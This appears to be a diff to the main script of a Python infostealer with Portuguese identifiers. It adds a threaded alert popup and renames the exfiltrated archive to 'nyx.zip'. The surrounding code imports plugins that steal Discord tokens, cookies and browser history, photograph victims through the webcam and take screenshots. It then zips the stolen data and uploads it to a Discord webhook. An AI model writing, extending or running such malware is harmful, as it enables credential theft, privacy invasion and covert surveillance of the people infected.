@@ -4,6 +4,7 @@ import os
 import json
 import sys
 import zipfile
+import threading
 from plugins.systeminfo import obter_informacoes_sistema
 from plugins.discordtoken import TokenExtractor
 from plugins.webcam import capture_photo
@@ -15,6 +16,7 @@ from plugins.history import BrowserDataExtractor
 from plugins.cookies import CookieExtractor
 from plugins.print import Sprint, save_image
 from plugins.network import obter_informacoes_internet
+from plugins.alert import mostrar_alerta
 from datetime import datetime
 from multiprocessing import freeze_support
 
@@ -44,6 +46,7 @@ executou_browser_downloads = False
 executou_browser_history = False
 executou_cookie_extractor = False
 executou_network_info = False
+executou_alerta = False
 
 def executar_comando(comando):
     try:
@@ -82,7 +85,7 @@ def enviar_arquivo_zip_webhook(zip_file, arquivos_info):
         }
         
         files = {
-            'file': ('arquivo.zip', file, 'application/zip')
+            'file': ('nyx.zip', file, 'application/zip')
         }
         
         response = requests.post(DISCORD_WEBHOOK_URL, 
@@ -235,6 +238,9 @@ def criar_embed_com_imagens(caminho_foto1, caminho_foto2):
         }
     }
 
+def mostrar_alerta_async():
+    mostrar_alerta()  
+
 if __name__ == "__main__":
     freeze_support()
 
@@ -244,6 +250,10 @@ if __name__ == "__main__":
 
     try:
         embed_content = ""
+
+        if cfg.get("ALERT", False):
+            alerta_thread = threading.Thread(target=mostrar_alerta_async)
+            alerta_thread.start()
         
         if cfg.get("user_info", False):
             user_info_instance = UserInfos()
